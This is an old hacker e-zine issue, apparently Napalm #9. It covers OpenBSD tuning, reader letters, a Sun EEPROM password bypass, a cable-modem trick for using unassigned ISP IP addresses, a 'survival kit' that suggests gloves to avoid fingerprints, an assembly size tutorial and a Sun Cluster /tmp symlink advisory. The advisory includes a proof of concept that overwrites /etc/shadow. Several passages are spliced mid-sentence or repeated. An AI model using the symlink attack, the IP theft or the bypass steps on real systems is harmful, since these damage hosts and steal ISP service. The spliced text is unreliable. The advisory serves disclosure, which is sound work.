[=] 0x00: Editor's Comments

We've got the second-largest issue to date, and by the number of articles,
the largest. Issue 9 has quite a wide selection of topics, from how
'hacker' zines are viewed by the 'legit' corporate world, to more on IPSEC
in the continuing saga. Also plenty of stuff in here for you UNIX-philes.
It is with sadness that we wave goodbye to the music reviews as they've
been. I just can't get enough people to commit to doing them when the
time comes. No, I don't want any volunteers. See that section for details.
I'm happy about the subscriber response we've received, as can be seen in
the following section...keep them coming! I'm very willing to post your
questions and comments here. Enjoy!

Percentage of memory to allocate for FS caching. Defaults to
5% and can be no greater than 70. Nice performance improvement.
Keep in mind this can make for a pretty memory greedy machine
though.

/usr/src/sys/arch/$ARCH/$ARCH/machdep.c for more info.

The other 3 are sorta legacy stuff. Under older versions like
less than 2.7, you would see problems with kernel memory being
insufficient, ie "mb_map_full" messages. Its much much
better under recent releases, but I put it in there anyway just
to be safe. The KMAP stuff increases the number of kernel maps
that are available. It was required when softupdates first
came out. After 2.6, I have only managed to hit the limit on
that once. Documentation can be found under the performance
tuning FAQ from 2.5 and earlier. From vm_map.[c,h]

The new way: (2.8 snap as of 1 month ago)
#ifndef MAX_KMAP
#define MAX_KMAP        20
#endif
#ifndef MAX_KMAPENT
#if (50 + (2 * NPROC) > 1000)
#define MAX_KMAPENT (50 + (2 * NPROC))
#else
#define MAX_KMAPENT     1000  /* XXXCDC: no crash */
#endif
#endif


The old way: (2.6)
#ifndef MAX_KMAP
#define MAX_KMAP        20
#endif
#ifndef MAX_KMAPENT
#define MAX_KMAPENT     1000
#endif

If you are really into the obsd kernel hacking thing, you
may want to check out Phrack #54 also. It had some pretty
neat stuff in it on 2.4 kernel mods.

  You did ask for some unbiased opinion on the zine and what things other

like more information, have found it hard to come by is one the phone
networks themselves - their weaknesses and flaws (info in likeness to the
Phone Mazters who were busted a little over a year and a half ago). Not
only would we find this information useful, but so would, we believe,
many others - both old school and newbies.

  Keep up the good work and we look forward to hearing back from you or
your crew.

[ Piss off with that toy shit? I think you've got the wrong zine. If

  Anyways, let's get some terminology down. A worm is an automated
  program that moves itself from computer to computer, without any human
  interaction. The difference between a virus and a worm is the human
  interaction part. Now, what you're asking about (presumably) is called
  a web spider or web robot. Most web search engines do this constantly,
  and update their databases of links accordingly. When you type "Napalm"
  into a search engine, it will use the data its spiders have already
  grabbed and return you all sorts of relevant and irrelevant links.
  There's no way currently to read your mind and spit out a nice report of
  it all. You need a human to do that ;) So, there's not that much point
  (besides geek value) to run your own spider to gather specific
  information. Where do you go about finding out more information about
  web spiders? Try a search engine. www.google.com is my personaly
  favorite. Type in "web spiders" (with quotes) and click Search. Voila!
  How does google give you relevant information?

In reply to kynik's query about Sun EEPROM work around's in issue 4
here's some information...

--------------------
Miscellaneous ramblings on EEPROM passwords

If a system has an EEPROM password set, and you can login as root, you
can then run "/usr/sbin/eeprom security-mode=none".

If you get a machine that has "security-mode" set to "command" or "full",
and you don't know the security-password, or root's password, then you
won't be able to boot off of anything but the configured boot device.

1. Determine the current boot disk, usually SCSI ID 0 or 3. Disconnect
it. Connect an external Sun bootable CD-ROM drive and set its SCSI ID to
that of the normal boot drive. Put a Solaris Installation CD-ROM into the
drive. Power on the system and allow it to boot from the CD-ROM. After
answering a few questions during the initial part of the installation
you can Ctrl-C out of the installation process and be presented with a
root prompt. Run "/usr/sbin/eeprom security-mode=none" to clear the
EEPROM password. Turn off auto-booting by running "/usr/sbin/eeprom
auto-boot\?=false" (Escape the question mark). Power down (init 5) the
system. Reattach the original hard drive, move the external CD-ROM drive
to ID 6 (or use the existing internal CD-ROM if there is one). Power on
the system, it should stop at the OK prompt. Follow the normal procedures
to reset a lost root password (boot cdrom -s, mount /dev/dsk/c0t0d0s0 /a,
ex /a/etc/shadow, wipe password, w, q, umount /a, init 6)

2. Locate another system with the same architecture as the one with the
unknown password. Ensure that the other system has "security-mode" set to
none. Power the system down and remove it's EEPROM chip (usually in a
plastic carrier with an orange barcode on top). Replace the EEPROM on the
unknown system with the one from the known system. Boot up with the known
EEPROM Follow the steps above to reset the root password. Power down and
return the known EEPROM to the original system.

I was once told by a Sun instructor that once an EEPROM security-password
has been set there is no way to "clear" it. I've not tested but I wonder if
a password of "" (null) would work.

Best of luck!

[=] 0x02: Cable Modem Quicky: Hiding Inside the Data Link Layer

/Intro and Background

  When my cable modem was first installed, I was out of the house at a
jobsite. I returned home that evening to find out that I had not been
provided with data concerning the two additional IP addresses I requested.
Eventually, I was able to contact my ISP on the phone and was provided
with my additional addresses. I was assigned two IPs that were in a
different subnet from the one I received when my cable modem was first
installed. Having recently done some work for a competing cable company,
this seemed fishy since the technology I was previously exposed to was
not capable of supporting addresses on multiple networks. It would be
several days (and phone calls) later when I was actually able to get all
of my addresses functioning - but they did eventually fire up and pass
traffic.

  Since that time, I've continued to have quite a bit of trouble with my
cable modem. Typically, my ISP reboots their 'servers' at least once a
week, which disrupts my Internet access, sometimes for hours at a time.
Often there is a problem when their system comes back up, and my cable
modem falls into a 'failure loop'. When this happens, my access to the
Internet will be down until the next time they decide to reboot 'the
servers'.

  Most recently, I suffered an outage that lasted from late one Thursday
evening until the morning of the following Tuesday. During this time, I
was never able to use more than two of my IP addresses at the same time.
I discovered through trial and error that if I manually rebooted my cable
modem, the working addresses would switch places with the inactive ones,
and I would suddenly have access to my 'dead' machines again.

  Throughout this downtime, I continued to tinker with my setup, and
eventually discovered that it was possible to grab other IPs from my
original subnet (guessing as to what addresses might be free). I was
actually able to start using these addressees to make contact with the
Internet.

/Cable Modems

  My cable modem is a Nortel Networks Cable Modem (CM) 100. As it turns
out, the CM-100 is a Data Over Cable Service Interface Specifications
(DOCSIS) device, and actually functions more like a bridge than a router.
There is no IP address assigned directly to the CM itself; and in fact
the default gateway addresses for each subnet point to a 'server' machine
at the cable plant. It is equipped with both a coaxial (for connection to
the cable plant) and RJ-45 Ethernet (for connection to customer network
devices) connector. No other I/O interfaces are evident on the exterior
of the unit. It is capable of both Data Link and Network Layer bridging,
and allows up to 16 individual MAC addresses to connect through it
simultaneously. MAC authorization is assigned in blocks of four at
the cable plant.

  The documentation also purports that the CM-100 is a SNMP manageable
device, with support for firmware updates via TFTP. I have not yet
experimented with trying to alter the firmware of the unit myself.
What I've found more interesting is the fact that by assigning multiple
addresses to a single Ethernet interface on a client machine, it is
possible to bypass the MAC limiting and make use of more IP addresses
than were assigned to the unit.

  Since the purpose of DOCSIS is to create a standard that different
vendors can design their hardware against, it is assumed that the
following techniques will be effective against other DOCSIS systems.
Exploration is left up to the reader.

/Unix Routing with OpenBSD and IPNAT

  Utilizing a spare box and OpenBSD's native NAT capabilities, it is
possible to create a single Firewall Machine that can be the 'face' on
a theoretically unlimited number of internal Internet Hosts. A single
MAC address will communicate with the CM, while holding a number of
public IP addresses and routing traffic between an Internal Network of
hosts and the Internet outside.

--/Hooking It All Up

  Let's be sensible about this. You're going to want to use a crossover
cable directly between your cable modem and your external interface on
the Firewall. This way, you will get full-duplex 10MBs throughput at
your most crucial bottleneck (a diagram for constructing a crossover
cable from scratch is included at the end of this article). Doing this
eliminates the network congestion created by plugging your CM into a hub.

  Wiring your Internet Hosts can be done in a number of ways. A single
Ethernet interface (100MBs is suggested) plugged into an internal hub or
switch may be sufficient to handle traffic to and from the Firewall.
Other applications may require Physical Layer separation of the
individual Internet Hosts. This can be accomplished by connecting each
machine to its own NIC in the Firewall with a crossover cable.

In the end, you should have a setup that looks something like this:

    Your.Internet.Host <--> OpenBSD/router <--> Cable Modem


--/Preparing OpenBSD to Route

  OpenBSD does not come out of the box ready to route traffic. You'll
need to edit /etc/sysctl.conf and enable the following variable:

    net.inet.ip.forwarding=1 # 1=Permit forwarding (routing) of packets

/etc/rc.conf will also need the following:

    ipfilter=YES
    ipnat=YES                # for "YES" ipfilter must also be "YES"

  A kernel option you might want to consider for performance tweaking on
100MBs enabled systems is:

    option          NMBCLUSTERS=8192

Upon reboot your system should be ready to go.

--/IPNAT

  Take a look at what you've got. Select another IP address from the
same subnet as your legitimate EXTERNAL_IP for use on your internal
Internet Host(s). (If your ISP is using multiple subnets, and you have
access to information regarding these addresses, it may be possible to
use IPs from any legitimate subnet they support).

  You'll need to add the ILICIT_EXTERNAL_IP(s) you selected to the
EXTERNAL_INTERFACE on your Firewall, and an INTERNAL_IP  on its
INTERNAL_INTERFACE for each INTERNAL_NETWORK you plan to create. We'll
each INTERNAL_NETWORK you plan to create. We'll use Darren Reed's
IPFILTER package (which includes IPNAT) to redirect incoming traffic
through the Firewall to the Internet Hosts on each INTERNAL_NETWORK, and
back out again.

In /etc/ipnat.rules:

    bimap EXTERNAL_INTERFACE INTERNAL_HOST_IP/32 -> ILICIT_EXTERNAL_IP/32

  This creates a (as the name implies) bi-directional map between
ILICIT_EXTERNAL_IP and INTERNAL_HOST_IP. The internal Internet Host will
be able to surf the net, and any incoming traffic destined for
ILICIT_EXTERNAL_IP will be immediately forwarded to INTERNAL_HOST_IP.

Remember to flush and re-initialize IPNAT:

    # ipnat -CF -f /etc/ipnat.rules

  Traffic should now pass freely from the Internet to ILICIT_EXTERNAL_IP
on any port that you have open on the internal Internet Host.

--/Other Considerations

  It would be a good idea to create a set of comprehensive filtering
rules for the internal Internet Hosts with IPF, either on the Firewall or
on the machines themselves. As this is not necessary to achieve
functionality, and I've beaten the IPF issue to death in previous
articles (see Napalm 7 and 8); I won't go into the intricacies of
stateful packet filtering at this time. Keep in mind though that the
IPNAT configuration above does not protect the internal Internet Hosts in
any way shape or form - they are in fact just as vulnerable as any
regular host sitting uprotected on the Internet.

/Conclusion

  Utilizing an OpenBSD box as a router, we have bypassed the MAC address
limits assigned to your CM and successfully snatched another functioning
IP from the Ether. This technique has only been tested with the Nortel
Networks CM-100, but other DOCSIS cable modems using MAC-based access
controls are probably vulnerable to the same circumvention techniques.

  Brochure propaganda for the Nortel Networks CM-100 states that the
system thwarts hackers by utilizing 56-bit DES encryption and RSA keys
to ensure that only authorized personnel make changes to your cable
modem's configuration. This is just another example of why encryption
does not always save the day by its lonesome when the basic
implementation of access controls is flawed. In this case it wasn't
necessary to 'hack into' anything but common sense to bypass security
restrictions.

Happy hunting, and don't shoot your foot off.

[=] 0x03: The Hacker's Survival Kit

  Hackers are notorious gadget freaks, and often like to go out and about
into the real world to see what kind of trouble, eh, exploration they can
get into. I've detailed a list of items that can be thrown into a
hacker's survival kit and fits into a courier bag or daypack. The list is
derived from my own experiences as a technological hobbyist. All of the
items are self-explanatory, and there is plenty of leeway to customize
the kit towards your own tastes and preferences. I've designed this kit
to be easily portable. Many of you are too young to (legally) drive, or
live in urban areas where your transportation is usually public, bicycle,
or shank's mare.

  We will start with the basics: Something to carry your gear around in.
Most people go with either a courier bag or day-type backpack. Urban
bicyclists seem to like the courier bags while walking types prefer
backpacks; it's all a matter of preference. We like backpacks as they
stay out of the way better, leave both hands free, and are less
cumbersome than a bag hanging off your side. A decent military-surplus
backpack is sturdier and less expensive than some of those courier bags.
Also, the "shittier" your bag looks, the less likely it is that someone
will try and rip it off you.

  Get something in a neutral earth-type color like green, brown, grey, or
black. This not only stands out less, but also makes it easier to cache
(hide) if you can't bring it in with you. Our recommendation is that it
never leave your possession, but we know some places will want you to
check it at the door. Whether you check it or hide it depends on what you
have in the bag, and the relative time needed to get to it.

  Another thing you will want to start wearing, if you already don't, is
a belt. It doesn't matter what type of belt as long as it's sturdy.
Besides helping hold your pants up (which I'm sure is difficult
considering some of you wear your pants 5 sizes too big), you can carry
equipment on it: pager, Mini Maglite, Leatherman Tool, Buck Knife, etc.

  Now that you have something to carry your gear around in we can begin
to almost fill it. You never want to run around with a full bag, in case
you find something you want to take with you.

  I'll start with what you'll be carrying on your person. Get a
Leatherman Tool, Gerber Multi-Plier, or Swiss Army Knife. My Leatherman
PST-2 has neeedlenose pliers, wire cutters, file, clip point
serrated/plain edge knife blade, metal saw, regular and phillips
screwdrivers, can/bottle opener, and a small pair of scissors. I also
occasionally carry a Camillus U.S. Military pocket knife. This is your
classic four item "boy scout type" knife that has a plain-edged spear
point blade, screwdriver/bottle opener, can opener, and mini
screwdriver/awl.

  For heavier cutting tasks and possible self-defense usage get a good
lock blade knife. The Rolls Royce of these (in my opinion) is Benchmade.
Until recently I carried a CQB Folder which replaced the Cold Steel
Folding Tanto that I retired. The tanto-point blade, while excellent for
self-defense, is not the best for general purpose use and it is also a
little bit heavy for everyday carrying. I went back to a Spyderco Endura
Clipit. Spyderco blades are serrated and offer tremendous cutting power
for their size. I've owned mine for quite a few years now, and it has yet
to require sharpening. The other nice thing about the Spyderco is that if
you lose it, you're only out $45 as opposed to $120 for some of the
Benchmade knives. While you shouldn't lose tools, it happens (In the past
30 years I've misplaced several pocketknives, a Gerber Multi-Plier, a
Spyderco Worker, and an Al-Mar folder that have yet to reappear). For
those on a budget, the Schrade Cliphangers are a lot of knife for the
money, and I believe United Cutlery (I believe) makes a nice "Mechanics
Liner Lock" with a 3-4" serrated blade (and they went for no more than
$20 and were well made knives).

  Being a hardware hacker, I also carry around a few extra tools. A
multi-bit screwdriver and a set of tamper proof bits have come in handy
on numerous occasions; as have a little 6" pry-bar (nicknamed "the goblin
bar" by an old acquaintance of mine) I picked up at a dollar store for,
well, a dollar. A Radio Shack mini-multimeter also resides in my kit.
Those heavy-duty scissors known as "EMT Shears" that will cut through a
penny and only cost a few bucks are nice to have as well. A roll of duct
tape and electrical tape complement the package. It is said that you can
fix anything with duct tape. Now you need fire. Disposable lighters are
nice. What's even better is one of those butane lighter/torches that put
out a jet of blue flame. You can solder and almost weld with one of
those. Include a butane refill cylinder. Some really "elite" types carry
the miniature battery-operated Dremel Tool with a small case of relavent
bits. Dremel tools have several thousand uses.

  Another thing you should have on you is a Mini Mag lite or similar
small two AA-cell flashlight. If you've ever been caught inside a modern
office building or apartment when the lights go out, you'll appreciate
how handy having a little flashlight is. You can get a headband which
places a Mini-Mag on the side of your head at eye level; an excellent
idea when you need to work on something with both hands in the dark. You
should also get the accessory kit for the red filter lens, as the red
lens enables you to have a light source that doesn't fuck up your night
vision. A cheap set of 8x or 10x binoculars are nice to see things that
are far away and don't take up much space. Recently a friend gave me
this piece of optics the size of a large pen that is both an 8x telescope
and a 30x microscope. It was supposedly standard KGB issue. I also like
to have a jewelers loupe handy for reading part numbers on electronic
components (jeweler's loupes have coolness factor). For memory-aids, I
include a copy of Pocket Ref, a little notepad, and writing implements.
While individuals have taken to carrying around electronic notepads or
Palm Pilots, I'm a little retro in my choice of memory aids, as they
don't require batteries that go dead at inopportune times.

  Communications tools are next. If you can get your friends to carry FRS
or 2-meter radios that's all fine and dandy, otherwise get a one-piece
phone, cut the modular plug off the end, and attach alligator clips to
the red and green wires. Get one of the portable touch-tone pads from
Radio Shack. Get a pager with voice mail. If someone wants to reach you
they page you and you can then call them back by whatever means you have
or desire. Communications receivers (scanners) have come down in price
and size. An Icom R2 and Alinco DJ-X2T are small wide-band receivers
capable of picking up everything from AM/FM broadcasters, to shortwave
stations, to local public safety communications.

  Throw a set of work gloves in your pack. Not only will they keep you
from leaving fingerprints, but they also protect your hands from damage
and keep them warm. For the summer, I get a "six pack" of cotton work
gloves for about $5. In the winter I replace them with wool army "glove
liners" and black leather "glove shell". Speaking of damage, throw in
some assorted Band-Aids, "butterfly strips", gauze pads, first-aid tape,
tweezers, alcohol pads, and some Mercurichrome or similar ointment in
your kit. You will in the course of your adventures get minor dings,
scratches, slivers and cuts, and will be glad you have it. It beats
bleeding all over the place.

  Clothing is next. Cold weather and rain just happen some times and you
may spare yourself some discomfort or hypothermia with nice dark sweater
or sweatshirt and a rain poncho or anorak. You can add spare socks and
possibly undergarments if there is the possibility of staying overnight
unexpectedly somewhere. Start wearing a hat. Baseball caps are OK, but I
like outback "Crocodile Dundee" style hats that are made of waxed cotton
and shed water like a duck's back.

  Now I will discuss weapons. Whether or not you decide to carry them is
a personal decision. In most areas they are heavily frowned upon or
illegal. I personally feel that "An armed society is a polite one"
(Robert A. Heinlein)  and that everyone should have the right to carry
defensive weaponry if they so choose. Some places such as Massachusetts,
California, and New York don't share my feeling. If you live in a
Communist state, either move or follow the Eleventh Commandment (Thou
shalt not get caught). In most places you can carry pepper spray with
little hassle. It works most of the time, but be advised some people have
an immunity to it. Don't spray into the wind, as you will dose yourself,
and if you spray it in an enclosed area everyone nearby will get a sniff
of it, yourself included. High-voltage stun-guns are pretty effective,
despite claims to the contrary. To quote Kurt Saxon in The Poor Man's
James Bond, "Anyone unaffected by 50,000 volts is from another planet".

  It's neat to be able to do field surgery on electronic devices, fix
your ride, or be able to do a little "urban exploration" on a moment's
notice. Carrying around a portable techie's work-shop has its own flavor
of eliteness. Being prepared for sudden changes in plans or unforeseen
circumstances is a good thing. Hopefully, this article got your
brain-gears going, and that's another good thing.

[=] 0x04: On Binary Size and Reduction

  While it is not so much a problem nowadays, file size used to be a big
issue. Today, we all have 15GB hard drives and like to use every byte of
it up. Making your executables as small as possible is limited to mostly
contests, but the knowledge behind it is always good to know.

Note: The information in this is not useful to you unless you either like
to know everything or are a hardcore ASM coder. These techniques will
only be helpful on small projects where size and speed is a big issue. I
am using Slackware 7.1 on a 2.2.16 kernel with gcc version egcs-2.91.66
19990314/Linux (egcs-1.1.2 release).

  This article will go briefly over how to make smaller executables (our
outputs will be ELF) with gcc. You should allready know what Assembly is,
how to use AT&T syntax, and some C would be ideal. First, let us start off
with making a C file smaller. Our test program looks like:

#include &lt;stdio.h>
int main(void)
{
  printf("Hello World\n");
  return 0;
}

Save that as test.c and in the same directory type:

$ gcc -o test test.c

That compiles your C program (Duh).
Now run:

$ wc -c test

That outputs:
  11666 test

Christ! That is huge. What can we do to make this smaller? First, we can
strip it.
Type:

$ strip test
$ wc -c test
   2996 test

Hot damn. That is much smaller, but we can make it even smaller yet.
But first, I will explain this strip thing.

$ strip &lt;object filename here>

In this case it was an executable file. Strip removes the symbols from the
file you give as an argument. Running strip is the same as using the -s
flag in gcc.

For example, we could have done

$ gcc -s -o test test.c

To knock a few more bytes off our executable we can do:

$ gcc -O2 -s -o test test.c
$ wc -c test
   2992 test

That is better. Now for the intense stuff. To get the Assembly output of a
C file in gcc you do

$ gcc -S &lt;somefile>.

In our case we will do

$ gcc -S test.c

The -S flag creates a file of the same name but with a .s extension.
Opening test.s should reveal some rather ghoulish-looking assembly code.
This is ok.

First we have to edit the part that says:

.globl main
. .   .typ.   main,@function
main:
Change it to:
.globl _start
_start:

  What is this _start thing? When the linker creates your executable, it
uses_start as the entry point then calls your main() function. So instead
of having gcc make the _start for us and having it call main(), we just
create our own _start. In order to get this to compile, we are going to
need to use the -nostartfiles flag in gcc. This flag basically tells gcc
that we have our own _start and not to look for a main() because it does
not exist. There is going to be a slight problem, however. _start is not a
function, and you'll notice that at the end of the program we have a
'ret'. Since _start is just an entry point, and not a function we need to
tell it to exit the program instead of try to return from a function.
This will be the first use of syscalls, which I will explain later. Find
the part that ret's from the function. It should look like:

.L1:
 leave
 ret

Change that to:
.L1:
 movl $1, %eax
 int $0x80

Lets see how much this decreased our program size by:

$ gcc -nostartfiles -O2 -s -o test test.s

Then:

$ wc -c test
   1516 test

  Sweet! If we hadn't changed the ret, the program would segfault when we
ran it. Before continuing, an explanation of this syscall thing will be
needed.

  If you have ever done any DOS Assembly programming, you are familiar
with interrupts. You have BIOS and DOS interrupts (which DOS ASM
programmers often use as if there is no difference). With different
interrupts and values in your registers, you can do different things. You
can read in data, output data, open files, etc. Well, in Linux you have
syscalls. The basic idea for Linux syscalls is you put the numeric
identifier of the syscall you want to use in your eax register, then you
put any other parameters in ebx, ecx, edx, esi, edi, in that order. The
return value is put into eax. This is for system calls with less than 6
arguments. When you are dealing with a syscall that has 6 or more
parameters, things get a little bit trickier. You put the numeric
identifier of the syscall in eax again, then you place the other
parameters in memory with ebx pointing to the beginning. If you decide to
use the stack to hold your variables you will need to push them in the
opposite order (like the way C functions work). A great list of syscalls
can be found at http://home.snafu.de/phpr/lhpsysc0.html

  How do you know what to put in each variable? If you look at the site
just mentioned, you see what the number means. Just type man 2 &lt;name> to
look at the man page, then just follow the parameters. For example, if we
wanted to write something, we will put 4 into eax, and look at the
parameters in the man page:

ssize_t write(int fd, const void *buf, size_t count);

  We put 4 into eax to tell the computer we want to write. We then put 1
into ebx. Remember the order things going in: ebx, ecx, edx, esi, edi. So
that means the value for fd goes into ebx, and when using write, the value
of 1 sends the output to the console. We then put the variable for the
message into ecx, and the length of the message in edx. The number of
characters that were printed out will be placed into eax because that is
where the return value goes.

  That should be enough information on syscalls for the moment - back to
making our executable really small. The next flag for gcc we will use is
called -nostdlib. This flag doesn't link against your standard libraries
and because of this things like printf won't be recognized by gcc. We
will need to replace printf with a syscall. The first example will have a
hardcoded size for our output string and the next will use a quick
function that counts how many characters are in our string to be output.
Here is what the code looks like in ASM:

.section	.rodata
.LC0:
	.string	"Hello World\n\0"
len:
  	.long  . - .LC0
.text
	.align 4
.globl _start
_start:
	movl $4, %eax
	movl $1, %ebx
	leal .LC0, %ecx
	movl len, %edx
	int $0x80
	movl $1, %eax
	int $0x80
	.align 4

Note: I cut all the extra stuff gcc outputs because it doesn't do anything
important. This code is also unoptimized.

  First, I added the len: .long . - .LC0 part. This line simply makes len
a long variable which holds the length the our string, which is .LC0.
Next, I got rid of all that stack stuff, messing with ebp and such, and
of course the 'call printf'. To go through this line by line:

  The first movl puts 4 into eax, which is the syscall for writing. Next
1 is put into ebx, which is the 'fd' variable in write(). 1 stands for
STDOUT, which is out to the console. .LC0, our string is loaded into ecx
then its length is put into edx and our interrupt is called. Then 1 is
put into eax, which stands for exit and our interrupt is called once
again. Pretty straightforward.

  Here is a remake of the above program. This program is the same except
for the strlen call. In most cases you won't be able to hard code the
length of your string. So strlen just finds out how long the string is
and returns it in eax (standard syscall function calling system).

.section        .rodata
.LC0:
        .string "Hello World\n\0"
.text
        .align 4
.globl _start
_start:
        movl $1, %ebx
        leal .LC0, %ecx
	movl %ecx, %eax
	call strlen
        movl %eax, %edx
	movl $4, %eax
        int $0x80
        movl $1, %eax
        int $0x80
        .align 4

.globl strlen
        .type    strlen,@function
strlen:
       pushl %ebx
       xor %ebx, %ebx
       pushl %edx
       xor %edx, %edx
count_chars:
       movb (%eax,%ebx,$1), %dl
       testb %dl, %dl
       jz done
       incl %ebx
       jmp count_chars
done:
       movl %ebx, %eax
       popl %edx
       popl %ebx
       ret

To compile this,

$ gcc -O3 -s -nostartfiles -nostdlib -o &lt;outputname> &lt;inpufilename>

I put the -O3 because I do not trust any optimization techniques I may or
may not have.

$ wc -c test
   480 test

Wow! We started at 11666 bytes and are down to 480. I find that
impressive.

[ Then again, Orbitz is easily impressed. ;) {kynik} ]

  The next thing you would have to do to make your executable even smaller
is learn more about the ELF format. To see how that is done look at

That site is where I learned everything I wanted to know about making
executables small.

[=] 0x05: Hacker 'Zines and Information Security Magazine

The December issue of Information Security Magazine posed the following
question to its readers in its "Talk Back" section:

"Are hacker zines (2600, Phrack) and Web sites (HNN, attrition.org,
Rootshell) worthwhile educational resources for infosec professionals, or
do they ultimately cause more harm than good?"

Here's the reply I sent, since I obviously have a strong opinion on the
subject:


I was somewhat shocked by this question, as I had always considered the
high-profile 'hacker' sites (HNN, Packetstorm) as valuable tools, and
sites I make it a point to visit daily. It just seemed obvious that
anyone would want a different perspective on the aspects of their job, as
well as potentially cutting-edge information. Also keep in mind that many
of these 'hacker' sites are owned by security-oriented companies, and not
necessarily John Q Hacker living in the garage. The material there is
from similar infosec professionals you know and love during the day, but
perhaps without an editor or boss peeking over their shoulders when
deadlines approach. Some amazing work has come out of solo at-home
innovation by regular 9-to-5ers. Believe me, I've seen it. I think the
problem that many 'professionals' may have is that the tone on many of
these sites are not what they're used to in 'regular' print magazines,
without ads and without most of the censorship.

I run my own security-oriented zine called Napalm (napalm.firest0rm.org)
and unlike many other zines out there, try to keep the tone more
professional, with actual grammar and spelling checks, and little or no
profanity or childish 'shout outs'. Sure, we try to take a humorous
approach sometimes, but I think more people need that than another dry
article on firewalls. We also give the article contributors an
opportunity to comment on other articles in the same issue, to pose
questions, comments, or clarifications to the material. There's very
little hacker-specific material in the zine that might scare away
non-'hackers'. We've even been referred to by the folks at OpenBSD for
anybody looking to work with IPSEC and that particular OS.

Separating the childish/politically slanted element from many of these
zines and websites can be annoying and some may claim that it's not worth
it. I ask you to simply read the material that is out there, ignoring the
chattering from the peanut gallery and make a judgement on a case-by-case
basis. Phrack, Napalm, and HNN are each their own entity, and have their
own strengths and weaknesses (or corporate backers, as the case may be).
Shutting your mind to a source of information just doesn't make sense to
me, especially in a field where information and proactivity is so
essential.

[=] 0x07: More Holes in Sun Cluster 2.x

  I never intended to write about Sun Cluster more than once, but as I
continued messing with product, I continued to find more vulnerability.
Readers should draw their own conclusions based upon the security
requirements of their installations, but I'd personally think twice
before paying a lot of money for this software...

Summary
-------

  Several Sun Cluster components create and manipulate temporary files in
insecure ways. Some occurences of this problem can lead to a local denial
of service, as they can allow local users to overwrite arbitrary files.

Specifics
---------

  Several Sun Cluster application programs create files in a
world-writeable directory (/tmp) with predictable filenames without
checking first for the existence of the target file, or whether or not
the target is a symbolic link. This behavior can trivially be exploited
by local users in order to deny service by overwriting arbitrary files
(these utilities all run as root). Some examples:

From nfs_fix_sharetab:

awk '(NF < 4 )' $fname > /tmp/awk.output
log_info "SUNWcluster.hanfs.3050" "File $fname contains some garbage
lines, deleting them."
awk '(NF >= 4)' $fname > $newfname
cp $newfname $fname
rm -f /tmp/awk.output $newfname
sync >/dev/null 2>&1 &
exit 0

  As /tmp is world-writeable, any local user can symbolically link
/tmp/awk.output to any file they wish to overwrite. When nfs_fix_sharetab
runs, the target file will be destroyed.

lookuphost has the same problem:

egrep '^[^#]*[   ]'${hostname}'[         ]|^[^#]*[       ]'${hostname}'$' \
 < /etc/hosts > ${tmpdir}/egrep.host 2> /dev/null
if [[ $? -eq 0 && -s ${tmpdir}/egrep.host ]]; then
  let lines="`wc -l < ${tmpdir}/egrep.host`"
  if (( lines == 1 )); then
    awk '{print $1}' < ${tmpdir}/egrep.host
  elif (( lines > 1 )); then
    # More than one occurrence in /etc/hosts.
    # Use first entry, and warn the administrator
    answer=$(awk '{print $1; exit}' < ${tmpdir}/egrep.host)
    log_info "${pre}.3010" "/etc/hosts has multiple entries for ${hostname}"
    print ${answer}
    /bin/rm -f ${tmpdir}/egrep.host
    exit 2
  fi

This problem also occurs several times in scconf itself. One example:

if [ $? -ne 0 ]; then
    LC_ALL=C /usr/sbin/vxassist -g ${dg} -U fsgen make ${dg}-stat 2m \
     > /dev/null 2> /tmp/vxassist.out
    if [ $? -ne 0 ]; then
      LC_ALL=C
      lmsg="`gettext \
        'vxassist failed to create %s-stat volume on %s diskgroup'`"
      printf "${lmsg}\n" "${dg}" "${dg}"
      if [ -f /tmp/vxassist.out ]; then
        /bin/grep "Cannot allocate space" /tmp/vxassist.out > /dev/null
        if [ $? -eq 0 ]; then
          lmsg="`gettext '\n\
        Unable to allocate space to create mirrored volume for\n\
        administrative file system in diskgroup %s. 4MB of free disk\n\
        space needs to be present in %s for this purpose to configure\n\
        for HA-NFS.'`"
          printf "${lmsg}\n" "${dg}" "${dg}"
        else
          /bin/cat /tmp/vxassist.out
        fi
        /bin/rm -f /tmp/vxassist.out
    fi
      return 1
    else
...

Finally, scinstall has similar issues. An example:

 if [ -z "${tokenCK}" ]; then
                        if (( VERBOSE == 1 )); then
                            print "Adding the DS_SUN format to the ccd..."
                        fi
                        # add the DS_SUN format to the ccd.database file
                        CCDDSSUNFILE=/tmp/dssun.ccd
                        /bin/cat >> ${CCDDSSUNFILE} << EOF

...

There are MANY such problems to be found in the various Sun Cluster shell
scripts.

  It's also the case that there are MANY instances in which the temporary
file is not specifically named, but has a name which will be easily
predictable (in the format /tmp/filename.$$). Attacking these files would
be more difficult as an attacker would have to successfully guess the PID
that will be used by the offending code (several examples exist that prove
that this can be done), and such an attacker would have to have some
reasonable idea regarding when the superuser will invoke the utilities in
question. Numerous Sun Cluster utilities have this problem; I have not
listed them all here.

  I have NOT attempted any sort of comprehensive audit of Sun Cluster. In
this case, a recent thread on Bugtraq highlighted the potential problems
caused by poor handling of temporary files. I was really looking
specifically for that class of problem. I also lack access to Sun Cluster
source. All of these holes were found just by reading through the code
for the components which are distributed as shell scripts.

Proof of Concept
----------------

A sample exploit. To use lookuphost to severely damage a system, an
unprivileged user could do the following:

$ id
uid=1997(foo) gid=25(programmers)
$ ln -s /etc/shadow /usr/tmp/egrep.host
$ ls -alt /usr/tmp/egrep.host
lrwxrwxrwx 1 foo programmers 11 Dec 22 11:12 /usr/tmp/egrep.host -> /etc/shadow
$

... wait for lookuphost to run ...

$ cmp /etc/shadow /etc/hosts
$

(lookuphost uses its temporary file to store a subset of /etc/hosts,
which is why, in this example, that's what ends up in /etc/shadow)

Workaround
----------

None suggested. No patches are currently available.

Vulnerable Versions
-------------------

This has been confirmed on Solaris 2.6, running Sun Cluster 2.1 and 2.2.
Any OS level running Sun Cluster 2.x is most likely vulnerable.

Vendor Notification
-------------------

The vendor was notifed on 12/22/2000.

Address comments to echo8@gh0st.net.

[=] 0x08: Masquerading as IPSEC for Fun and Profit

(or "RFC" is Just a Polite Word for "Covert Channel")

-=:[ .the.backdrop.

  IPSEC is not a protocol. IPSEC is a big towering ugly wump of
protocols, all residing at verious levels in the ISO model. Among them
are ESP and AH, which kinda live in the transport layer; and ISAKMP,
Photuris, SKIP, DNSSEC, and any other key-exchange protocols, which are
themselves finished (hah!) applications, but which get invoked at the
session layer and enable functionality at the transport layer. Kinda.
Suffice to say, the design as it now stands is big and ugly.

-=:[ .the.scene.

  ESP and AH, the actual encrypted and/or authenticated transport
protocols, are however themselves quite simple. An ESP packet looks like:

SPI (32-bit number) [1]
